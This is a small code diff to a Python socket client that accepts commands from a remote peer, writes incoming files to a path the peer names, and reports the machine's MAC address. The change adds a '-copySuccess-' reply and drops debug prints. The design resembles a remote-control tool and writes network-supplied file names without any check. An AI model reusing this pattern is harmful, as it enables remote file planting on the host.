@@ -104,7 +104,6 @@ def connect():
                     fileName = conn.recv(1024).decode("utf8")
                 except:
                     pass
-                print(fileName)
                 with open(fileName, 'wb') as f:
                     while True:
                         byteRead = b''
@@ -116,7 +115,10 @@ def connect():
                             break
                         f.write(byteRead)                        
                     f.close()
-                print("Here")
+                try:
+                    conn.sendall(bytes("-copySuccess-", "utf8"))
+                except:
+                    pass
                         
             elif encodedData == "-getmac-":
                 conn.sendall(bytes(gma(), "utf8"))
